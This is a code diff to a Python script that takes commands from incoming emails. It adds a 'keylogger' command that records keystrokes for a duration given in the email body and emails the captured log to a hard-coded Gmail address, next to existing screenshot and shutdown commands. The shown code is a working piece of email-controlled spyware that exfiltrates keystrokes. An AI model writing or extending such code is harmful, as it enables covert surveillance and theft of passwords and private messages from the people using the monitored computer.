@@ -6,6 +6,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.image import MIMEImage
 from email.header import decode_header
 import screenshot
+import keylogger
 import shutdown
 
 username_sender = "test.sender.pp@gmail.com"
@@ -59,6 +60,13 @@ def fetch_and_process_emails():
                     send_email(username_receiver, username_sender,
                                "Shutting Down PC!", "PC is shutting down...", False)
                     shutdown.shutdown()
+                elif subject == "keylogger":
+                    # see the body of the email, it contains the duration of keylogging
+                    body = msg.get_payload(decode=True).decode()
+                    duration = int(body.split()[0])
+                    content = keylogger.get_key_log(duration)
+                    send_email(username_receiver, username_sender,
+                               "Keylogger report", content, False)
                 else:
                     send_email(username_receiver, username_sender,
                                "Invalid command", "Command not found", False)
